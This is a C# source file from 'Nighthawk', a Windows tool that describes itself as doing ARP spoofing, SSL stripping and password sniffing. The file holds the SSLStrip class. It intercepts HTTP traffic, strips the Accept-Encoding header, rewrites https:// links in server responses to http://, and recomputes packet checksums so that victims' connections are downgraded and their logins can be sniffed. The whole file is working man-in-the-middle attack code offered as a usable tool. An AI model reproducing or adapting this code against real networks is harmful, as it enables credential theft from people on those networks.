using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using PacketDotNet;
using SharpPcap;
using SharpPcap.WinPcap;

/**
Nighthawk - ARP spoofing, simple SSL stripping and password sniffing for Windows
Copyright (C) 2010  Klemen Bratec

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
**/
namespace Nighthawk
{
    public class SSLStrip
    {
        // current device
        private WinPcapDevice device;

        // status
        public bool Started = false;

        // exclusion
        private bool excludeLocalIP = false;
        private DeviceInfo deviceInfo;

        // access to ARPTools
        private ARPTools arpTools;

        // regex 
        private Regex regexEncoding = new Regex(@"Accept-Encoding: (.*?)\r\n", RegexOptions.Compiled | RegexOptions.Singleline);
        private Regex regexType = new Regex(@"(GET|POST) (.*?) HTTP\/1\.(0|1)", RegexOptions.Compiled | RegexOptions.Singleline);
        private Regex regexCType = new Regex(@"Content-Type: (.*?)\r\n", RegexOptions.Compiled | RegexOptions.Singleline);
        private Regex regexModified = new Regex(@"If-Modified-Since: (.*?)\r\n", RegexOptions.Compiled | RegexOptions.Singleline);
        private Regex regexLocation = new Regex(@"Location: (.*?)\r\n", RegexOptions.Compiled | RegexOptions.Singleline);

        // encoding converter
        private static UTF8Encoding encodingUtf8 = new UTF8Encoding();

        // list of URL's with stripped (expired) cookies
        private List<StrippedCookiesURL> strippedCookies = new List<StrippedCookiesURL>();

        // SSL stripped event
        public event SSLStripHandler SSLStripped;

        private void Stripped(string sourceIP, string destIP, List<string> changed)
        {
            if (SSLStripped != null) SSLStripped(sourceIP, destIP, changed);
        }

        // constructor
        public SSLStrip(DeviceInfo deviceInfo)
        {
            // store our network interface
            device = deviceInfo.Device;
            this.deviceInfo = deviceInfo;
        }

        // start SSL strip
        public void Start(bool excludeLocalIP, ARPTools arpTools)
        {
            this.excludeLocalIP = excludeLocalIP;
            this.arpTools = arpTools;

            Started = true;
        }

        // stop SSL strip
        public void Stop()
        {
            Started = false;
        }

        // process packet (true/false to prevent from routing it)
        public bool ProcessPacket(Packet rawPacket, TcpPacket packet)
        {
            var sourceIP = (packet.ParentPacket as IpPacket).SourceAddress.ToString();
            var destIP = (packet.ParentPacket as IpPacket).DestinationAddress.ToString();

            var payload = packet.PayloadData;

            // exclusion of local IP
            if ((sourceIP == deviceInfo.IP || destIP == deviceInfo.IP)) return true;

            // check payload
            if (packet.PayloadData == null) return true;

            // decode content
            var data = encodingUtf8.GetString(payload);
            
            if (data != string.Empty)
            {
                var changed = new List<string>();
                var matches = SimpleRegex.GetMatches(regexType, data);

                // client request
                if (matches.Count > 2)
                {
                    // check for images
                    if (matches[2].Contains(".png") || matches[2].Contains(".jpg") || matches[2].Contains(".gif")) return true;

                    if (data.Contains("Accept-Encoding:"))
                    {
                        // replace Accept-encoding (prevent unreadable data)
                        var diff = data.Length - regexEncoding.Replace(data, "Accept-Encoding: \r\n").Length;

                        var extra = string.Empty;

                        for (int i = 0; i < diff; i++)
                        {
                            extra += " ";
                        }

                        data = regexEncoding.Replace(data, "Accept-Encoding: "+ extra +"\r\n");

                        changed.Add("Accept-Encoding");
                    }

                    if (data.Contains("If-Modified-Since:"))
                    {
                        var time = new DateTime(2000, 1, 1);
                        
                        data = regexModified.Replace(data, "If-Modified-Since: "+ time.ToString("R") +"\r\n");
                        changed.Add("If-Modified-Since");
                    }
                }
                // server response
                else
                {                    
                    // check for html tags
                    if (!(data.Contains("<form") || data.Contains("<input") || data.Contains("<a ") || data.Contains("</a>") || data.Contains("</div>") || data.Contains("<meta") || data.Contains("javascript"))) return true;

                    var cmatches = SimpleRegex.GetMatches(regexCType, data);

                    // check for images
                    if (cmatches.Count > 1 && cmatches[1].Contains("image")) return true;

                    if (data.Contains("\"https://") || data.Contains("'https://"))
                    {
                        data = data.Replace("\"https://", "\" http://");
                        data = data.Replace("'https://", "' http://");

                        changed.Add("HTTPS");
                    }
                }
                
                if (changed.Count > 0)
                {
                    // re-pack data
                    var bytes = encodingUtf8.GetBytes(data);
                    
                    var diff = packet.PayloadData.Length - bytes.Length;

                    packet.PayloadData = bytes;
                    packet.UpdateTCPChecksum();

                    var ip = (packet.ParentPacket as IPv4Packet);
                    ip.TotalLength = ip.HeaderLength + packet.Bytes.Length;
                    ip.PayloadLength = (ushort)packet.Bytes.Length;
                    ip.Checksum = (ushort)(ip.Checksum + diff); // dirty checksum fix

                    Stripped(sourceIP, destIP, changed);
                }
            }

            return true;
        }
    }

    public class StrippedCookiesURL
    {
        public string SourceIP;
        public string URL;
    }

    // SSLStripHandler
    public delegate void SSLStripHandler(string sourceIP, string destIP, List<string> changed);
}
